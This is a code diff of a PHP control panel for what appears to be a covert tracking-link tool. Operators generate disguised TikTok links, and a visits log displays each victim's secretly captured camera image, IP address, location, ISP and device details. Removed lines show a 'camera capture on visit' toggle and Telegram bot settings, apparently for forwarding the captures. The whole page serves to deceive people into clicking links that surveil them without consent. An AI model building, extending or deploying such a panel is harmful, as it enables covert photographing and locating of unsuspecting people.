+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
+        .capture-card { background: #050b14; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; padding: 15px; }
+        .capture-card img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; margin-bottom: 10px; }
+        @media (max-width: 768px) { .app-container { flex-direction: column; height: auto; } .sidebar { width: 100%; } }
     </style>
 </head>
 <body>
 
 <?php if (!$is_logged_in): ?>
     <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh;">
-        <div class="card" style="width: 100%; max-width: 400px; margin: 20px; border-color: var(--accent);">
-            <div class="card-title" style="justify-content: center; font-size: 20px; text-shadow: 0 0 10px var(--accent);">Login</div>
-            <?php if (!empty($login_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
+        <div class="card" style="width: 100%; max-width: 400px;">
+            <h2 style="text-align: center; margin-bottom: 20px; color: var(--accent);">Login</h2>
+            <?php if (!empty($login_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 10px; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
             <form method="POST">
                 <div class="form-group"><input type="text" name="username" placeholder="Username" required autofocus></div>
                 <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
-                <button type="submit" name="login" class="btn btn-block">Login</button>
+                <button type="submit" name="login" class="btn">Login</button>
             </form>
         </div>
     </div>
 <?php else: ?>
-
     <div class="app-container">
         <aside class="sidebar">
-            <div class="sidebar-header">
-                <h2>Control Panel</h2>
-                <p>Aziz Edition V23</p>
-            </div>
-            
-            <button class="nav-item active" onclick="switchTab('home')">Home</button>
-            <?php if ($is_admin): ?>
-            <button class="nav-item" onclick="switchTab('team')">Team Management</button>
-            <?php endif; ?>
-            <button class="nav-item" onclick="switchTab('settings')">Settings</button>
-
-            <div class="sidebar-footer">
-                <div class="user-profile">
-                    <div class="user-avatar"><?php echo strtoupper(substr($current_username, 0, 1)); ?></div>
-                    <div>
-                        <div style="font-weight: bold; font-size: 14px;"><?php echo htmlspecialchars($current_username); ?></div>
-                        <div style="font-size: 11px; color: var(--muted);"><?php echo $is_admin ? 'Admin' : 'User'; ?></div>
-                    </div>
-                </div>
-                <a href="?logout=1" class="btn btn-danger" style="width: 100%;">Logout</a>
-            </div>
+            <h2>Control Panel</h2>
+            <p style="color: var(--muted); font-size: 12px; margin-bottom: 20px;">Welcome, <?php echo htmlspecialchars($current_username); ?></p>
+            <a href="?logout=1" class="btn btn-danger" style="margin-top: auto; text-align: center; text-decoration: none;">Logout</a>
         </aside>
-
         <main class="main-content">
-            <div id="tab-home" class="tab-content active">
-                <h2 style="font-size: 20px; margin-bottom: 20px;">Welcome, <?php echo htmlspecialchars($current_username); ?></h2>
-
-                <div class="stats-grid">
-                    <div class="stat-card"><h3>My Links</h3><p><?php echo $total_links; ?></p></div>
-                    <div class="stat-card"><h3>Total Visits</h3><p style="color: #38bdf8; text-shadow: 0 0 10px #38bdf8;"><?php echo $total_captures; ?></p></div>
-                    <div class="stat-card"><h3>Today's Visits</h3><p style="color: var(--success); text-shadow: 0 0 10px var(--success);"><?php echo $today_captures; ?></p></div>
-                </div>
-
-                <div class="card" style="border-color: var(--accent);">
-                    <div class="card-title">Create New TikTok Link</div>
-                    <form method="POST">
-                        <div class="form-group">
-                            <label>Link Name</label>
-                            <input type="text" name="link_name" required>
-                        </div>
-                        <div class="form-group">
-                            <label>TikTok Video URL</label>
-                            <input type="text" name="target_url" required>
-                        </div>
-                        <div class="form-group" style="display: flex; align-items: center; gap: 10px;">
-                            <input type="checkbox" name="use_camera" value="1" checked style="width: 18px; height: 18px; accent-color: var(--accent);">
-                            <label style="margin: 0; cursor: pointer; font-size: 13px;">Enable camera capture on visit</label>
-                        </div>
-                        <button type="submit" name="create" class="btn" style="width: 100%;">Generate Link</button>
-                    </form>
-
-                    <?php if (!empty($generated_link)): ?>
-                        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); padding: 15px; border-radius: 8px; margin-top: 20px;">
-                            <div class="form-group">
-                                <label style="color: var(--success);">Link Ready:</label>
-                                <div style="display: flex; gap: 10px;">
-                                    <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>" style="flex:1; border-color: var(--success); color: #38bdf8;">
-                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">Copy</button>
-                                </div>
-                            </div>
-                        </div>
-                    <?php endif; ?>
-                </div>
-
-                <div class="card">
-                    <div class="card-title" style="display: flex; justify-content: space-between;">
-                        <span>Visits Log</span>
-                        <a href="/" class="btn" style="background: #334155; padding: 4px 10px; font-size: 12px;">Refresh</a>
+            <div class="card">
+                <h3>Create New Tracking Link</h3>
+                <form method="POST" style="margin-top: 15px;">
+                    <div class="form-group"><label>Link Name</label><input type="text" name="link_name" required></div>
+                    <div class="form-group"><label>TikTok Video URL</label><input type="text" name="target_url" required></div>
+                    <button type="submit" name="create" class="btn">Generate Link</button>
+                </form>
+                <?php if (!empty($generated_link)): ?>
+                    <div style="margin-top: 15px; padding: 10px; background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); border-radius: 6px;">
+                        <label style="color: var(--success); font-size: 12px;">Link Ready:</label>
+                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>" style="margin-top: 5px; color: #38bdf8;">
                     </div>
-
-                    <?php if (empty($captures)): ?>
-                        <p style="text-align: center; color: var(--muted); padding: 20px;">No records yet.</p>
-                    <?php else: ?>
-                        <div class="gallery-grid">
-                            <?php foreach ($captures as $cap): ?>
-                                <div class="capture-card">
-                                    <div style="background: rgba(139, 92, 246, 0.2); padding: 10px; font-weight: bold; color: var(--accent); text-align: center; border-bottom: 1px solid var(--border);">
-                                        <?php echo htmlspecialchars($cap['link_name'] ?? 'Unnamed Link'); ?>
-                                    </div>
-
-                                    <?php if (!empty($cap['image_data'])): ?>
-                                        <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
-                                    <?php else: ?>
-                                        <div style="width: 100%; height: 200px; background: #0b1329; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 13px;">No image captured</div>
-                                    <?php endif; ?>
-
-                                    <div class="capture-info">
-                                        <div class="info-row"><span>Code:</span> <span><?php echo htmlspecialchars($cap['code']); ?></span></div>
-                                        <div class="info-row"><span>IP:</span> <span><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
-                                        <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
-                                        <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
-                                        <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
-                                        <div class="info-row"><span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span></div>
-                                        <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn btn-danger" style="margin-top: 10px; padding: 8px; font-size: 12px;" onclick="return confirm('Delete record?');">Delete Record</a>
-                                    </div>
-                                </div>
-                            <?php endforeach; ?>
-                        </div>
-                    <?php endif; ?>
-                </div>
+                <?php endif; ?>
             </div>
 
-            <?php if ($is_admin): ?>
-            <div id="tab-team" class="tab-content">
-                <div class="card">
-                    <div class="card-title">Add New Member</div>
-                    <form method="POST" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
-                        <div class="form-group"><input type="text" name="new_username" placeholder="Username" required></div>
-                        <div class="form-group"><input type="password" name="new_password" placeholder="Password" required></div>
-                        <div class="form-group"><input type="text" name="new_tg_chat" placeholder="Telegram Chat ID"></div>
-                        <div class="form-group"><input type="text" name="new_tg_token" placeholder="Bot Token"></div>
-                        <div class="form-group"><button type="submit" name="add_user" class="btn btn-success" style="width: 100%; height: 100%;">Add</button></div>
-                    </form>
-                </div>
-            </div>
-            <?php endif; ?>
-
-            <div id="tab-settings" class="tab-content">
-                <div class="card" style="max-width: 600px; margin: 0 auto;">
-                    <div class="card-title">Change Password</div>
-                    <form method="POST">
-                        <div class="form-group"><label>Current Password</label><input type="password" name="current_password" required></div>
-                        <div class="form-group"><label>New Password</label><input type="password" name="new_password" required></div>
-                        <div class="form-group"><label>Confirm New Password</label><input type="password" name="confirm_password" required></div>
-                        <button type="submit" name="change_my_password" class="btn" style="width: 100%;">Save Changes</button>
-                    </form>
-                </div>
+            <div class="card">
+                <h3>Visits Log</h3>
+                <?php if (empty($captures)): ?>
+                    <p style="color: var(--muted); text-align: center; padding: 20px;">No records yet.</p>
+                <?php else: ?>
+                    <div class="gallery-grid" style="margin-top: 15px;">
+                        <?php foreach ($captures as $cap): ?>
+                            <div class="capture-card">
+                                <div style="font-weight: bold; color: var(--accent); margin-bottom: 8px;"><?php echo htmlspecialchars($cap['link_name']); ?></div>
+                                <?php if (!empty($cap['image_data'])): ?>
+                                    <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
+                                <?php else: ?>
+                                    <div style="height: 180px; background: #050b14; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 12px; border-radius: 6px; margin-bottom: 10px;">No image</div>
+                                <?php endif; ?>
+                                <div style="font-size: 12px; color: var(--muted);">IP: <span style="color: var(--text);"><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
+                                <div style="font-size: 12px; color: var(--muted);">Location: <span style="color: var(--success);"><?php echo htmlspecialchars($cap['location']); ?></span></div>
+                                <div style="font-size: 12px; color: var(--muted);">Device: <span style="color: #a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
+                                <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn btn-danger" style="margin-top: 10px; padding: 6px; font-size: 11px; text-align: center; text-decoration: none; display: block;" onclick="return confirm('Delete?');">Delete</a>
+                            </div>
+                        <?php endforeach; ?>
+                    </div>
+                <?php endif; ?>
             </div>
         </main>
     </div>
 <?php endif; ?>
-
-<div class="toast" id="toast">Copied successfully!</div>
-<script>
-    function switchTab(tabId) {
-        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
-        document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
-        document.getElementById('tab-' + tabId).classList.add('active');
-        event.currentTarget.classList.add('active');
-    }
-    function copyText(text, btn) {
-        navigator.clipboard.writeText(text).then(() => {
-            const t = document.getElementById('toast');
-            t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), 2000);
-        });
-    }
-</script>
 </body>
 </html>
